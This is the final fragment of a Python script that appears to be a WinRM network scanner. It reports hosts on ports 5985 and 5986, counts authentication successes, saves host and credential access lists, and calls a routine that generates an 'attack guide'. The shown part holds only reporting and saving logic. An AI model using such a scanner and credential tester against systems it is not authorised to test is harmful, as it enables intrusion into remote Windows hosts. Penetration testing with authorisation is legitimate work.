    print(f"WinRM hosts found: {winrm_hosts}/{len(ips)}")
    print(f"  HTTP (5985): {http_hosts}")
    print(f"  HTTPS (5986): {https_hosts}")
    if args.test_auth:
        print(f"Authentication successes: {auth_success}")
    
    # Save results
    if results:
        save_winrmlist(results)
        if auth_success > 0:
            save_access_list(results, args.username, args.password)
        save_details(results)
        save_json(results)
        
        # Generate attack guide if any WinRM hosts found
        if winrm_hosts > 0:
            generate_winrm_guide(results, args)
    
    print(f"\n{GREEN}[+] Scan complete!{RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
        sys.exit(0)
